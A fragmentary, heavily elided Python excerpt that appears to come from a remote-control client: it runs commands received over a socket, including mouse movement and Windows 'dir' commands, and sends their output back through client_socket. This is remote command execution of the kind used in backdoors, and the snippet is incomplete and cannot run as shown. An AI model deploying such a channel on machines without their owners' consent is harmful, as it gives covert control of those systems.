...
def run_command(command, return_value = False):
    try:
        response = run(command, capture_output = return_value).stdout.decode()
            ...
            for key in response.keys():
                if key == 'move mouse':
                    ...
                    if sys.platform == 'win32' and return_response and command.startswith('dir '):
                        ...
                        if return_response:
                            Thread(target = lambda: client_socket.send(run_command(command, True).encode())).start()
                        else:
                            Thread(target = lambda: run_command(command, False)).start()
